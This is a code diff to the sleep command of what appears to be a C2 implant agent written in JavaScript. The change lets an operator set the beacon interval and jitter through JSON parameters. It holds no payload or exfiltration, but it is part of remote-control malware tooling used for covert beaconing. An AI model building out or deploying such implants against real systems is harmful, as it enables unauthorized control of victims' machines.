@@ -1,16 +1,15 @@
 exports.sleep = function(task, command, params){
     try{
-        let temp_time = parseInt(params);
-        if(isNaN(temp_time)){
-            return JSON.stringify({"user_output":"Failed to update sleep time in seconds to: " + params, "completed": true, "status": "error"});
+        let command_params = JSON.parse(params);
+        if(command_params.hasOwnProperty('interval') && command_params['interval'] > 0){
+            C2.interval = command_params['interval'];
         }
-        if(temp_time < 0){
-            temp_time = temp_time * -1;
+        if(command_params.hasOwnProperty('jitter') && command_params['jitter'] >= 0 && command_params['jitter'] <= 100){
+            C2.jitter = command_params['jitter'];
         }
-        C2.interval = temp_time;
-        return JSON.stringify({"user_output":"Sleep updated to: " + C2.interval, "completed": true});
+        return {"user_output":"Sleep interval updated to " + C2.interval + " and sleep jitter updated to " + C2.jitter, "completed": true};
     }catch(error){
-        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
+        return {"user_output":error.toString(), "completed": true, "status": "error"};
     }
 };
 
